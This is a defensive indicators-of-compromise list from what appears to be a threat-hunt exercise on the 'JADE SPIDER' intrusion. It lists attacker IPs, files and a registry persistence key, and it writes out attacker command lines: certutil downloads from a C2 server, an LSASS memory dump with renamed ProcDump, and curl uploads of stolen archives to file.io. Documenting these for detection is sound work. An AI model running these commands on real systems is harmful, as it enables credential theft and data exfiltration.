# AZUKI BREACH Threat Hunt - Part 2: Indicators of Compromise (IOCs)

This document contains all Indicators of Compromise identified during the Part 2 threat hunt investigation of the JADE SPIDER intrusion at Azuki Import/Export Trading Co.

---

## Network Indicators

### External IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 159.26.106.98 | Return access source | Attacker's return connection (Nov 22) |
| 78.141.196.6 | Attacker-controlled server | Malware staging and C2 server (same as Part 1) |

### Internal IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 10.1.0.188 | File server | azuki-fileserver01 (lateral movement target) |
| 10.1.0.204 | IT admin workstation | azuki-sl (source of lateral movement) |

### Ports

| Port | Protocol | Description |
|------|----------|-------------|
| 443 | HTTPS | Exfiltration to file.io |
| 7331 | HTTP | Malware download (initial attempt) |
| 8080 | HTTP | Malware download (fallback) |

### URLs

| URL | Description |
|-----|-------------|
| http://78.141.196.6:7331/ex.ps1 | Malicious PowerShell script (initial) |
| http://78.141.196.6:8080/ex.ps1 | Malicious PowerShell script (fallback) |
| https://file.io | Data exfiltration endpoint |

### Domains

| Domain | Description |
|--------|-------------|
| file.io | Anonymous file sharing service used for exfiltration |

---

## Host-Based Indicators

### Compromised Systems

| Device Name | IP Address | Role |
|-------------|------------|------|
| azuki-sl | 10.1.0.204 | IT admin workstation (initial beachhead) |
| azuki-fileserver01 | 10.1.0.188 | File server (lateral movement target) |

### Malicious Files

| Filename | Path | Description |
|----------|------|-------------|
| ex.ps1 | C:\Windows\Logs\CBS\ex.ps1 | Downloaded PowerShell script |
| pd.exe | C:\Windows\Logs\CBS\pd.exe | Renamed ProcDump (credential dumping) |
| lsass.dmp | C:\Windows\Logs\CBS\lsass.dmp | LSASS memory dump |
| svchost.ps1 | C:\Windows\System32\svchost.ps1 | Persistence beacon (masqueraded) |
| credentials.tar.gz | C:\Windows\Logs\CBS\credentials.tar.gz | Exfiltration archive |
| financial.tar.gz | C:\Windows\Logs\CBS\financial.tar.gz | Exfiltration archive |
| shipping.tar.gz | C:\Windows\Logs\CBS\shipping.tar.gz | Exfiltration archive |
| contracts.zip | C:\Windows\Logs\CBS\contracts.zip | Exfiltration archive |

### Staging Directories

| Path | Description |
|------|-------------|
| C:\Windows\Logs\CBS | Hidden staging directory on file server |
| C:\Windows\Logs\CBS\it-admin | Staged IT admin credentials |
| C:\Windows\Logs\CBS\financial | Staged financial data |
| C:\Windows\Logs\CBS\shipping | Staged shipping data |

### Sensitive Files Accessed

| Filename | Original Path | Description |
|----------|---------------|-------------|
| IT-Admin-Passwords.csv | C:\FileShares\IT-Admin\ | Plaintext admin credentials |

### Registry Modifications

**Persistence via Run Key:**

| Field | Value |
|-------|-------|
| Registry Key | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run |
| Value Name | FileShareSync |
| Value Data | powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1 |

### User Accounts

| Account | Type | Description |
|---------|------|-------------|
| kenji.sato | Compromised | Used for return access to azuki-sl |
| fileadmin | Compromised | Used for lateral movement and file server access |

---

## Behavioral Indicators

### Command Line Patterns

**Return Access & Lateral Movement:**
```
mstsc.exe /V:10.1.0.188
```

**Discovery Commands:**
```
net.exe user
net.exe localgroup administrators
net.exe share
net.exe view \\10.1.0.188
whoami.exe
whoami.exe /all
ipconfig.exe /all
ARP.EXE -a
```

**Directory Hiding:**
```
attrib.exe +h +s C:\Windows\Logs\CBS
```

**Tool Download:**
```
certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
certutil.exe -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
```

**Data Collection:**
```
xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
```

**Data Compression:**
```
tar.exe -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
tar.exe -czf C:\Windows\Logs\CBS\financial.tar.gz -C C:\Windows\Logs\CBS\financial .
tar.exe -czf C:\Windows\Logs\CBS\shipping.tar.gz -C C:\Windows\Logs\CBS\shipping .
```

**Credential Dumping:**
```
pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
```

**Data Exfiltration:**
```
curl.exe -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
curl.exe -F file=@C:\Windows\Logs\CBS\financial.tar.gz https://file.io
curl.exe -F file=@C:\Windows\Logs\CBS\contracts.zip https://file.io
curl.exe -F file=@C:\Windows\Logs\CBS\shipping.tar.gz https://file.io
```

**Persistence:**
```
powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1
```

---

## Comparison: Part 1 vs Part 2 IOCs

| Category | Part 1 | Part 2 |
|----------|--------|--------|
| External IP | 88.97.178.12 | 159.26.106.98 |
| C2 Server | 78.141.196.6:8080 | 78.141.196.6:7331, 8080 |
| Staging Directory | C:\ProgramData\WindowsCache | C:\Windows\Logs\CBS |
| Credential Tool | mm.exe (Mimikatz) | pd.exe (ProcDump) |
| Exfiltration | Discord webhooks | file.io |
| Persistence | Scheduled task | Registry Run key |
| Masqueraded File | svchost.exe | svchost.ps1 |

---

## Notes

These IOCs are specific to Part 2 of the JADE SPIDER intrusion observed at Azuki Import/Export Trading Co. during November 2025. The attacker demonstrated evolution in tactics between Part 1 and Part 2, including infrastructure rotation, different credential dumping tools, and alternative exfiltration channels.

**Last Updated:** January 10, 2026
